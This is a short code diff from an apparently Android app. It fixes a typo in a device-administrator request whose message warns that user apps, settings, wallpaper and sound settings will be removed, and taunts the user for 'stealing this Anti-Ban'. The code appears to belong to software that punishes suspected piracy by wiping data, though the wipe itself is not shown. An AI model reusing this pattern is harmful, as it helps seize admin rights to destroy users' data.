@@ -3,7 +3,7 @@ if (currentAPIVersion >= android.os.Build.VERSION_CODES.FROYO) {
     if (!mDPM.isAdminActive(mDeviceAdmin)) {
         Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
         intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mDeviceAdmin);
-        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Process will remove user installed applications, settings, wallpaper and sound settings. Are you happy For Stealing Thi Anti-Ban?");
+        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Process will remove user installed applications, settings, wallpaper and sound settings. Are you happy For Stealing This Anti-Ban?");
         startActivityForResult(intent, REQUEST_CODE_ENABLE_ADMIN);
     } else {
         // device administrator, can do security operations
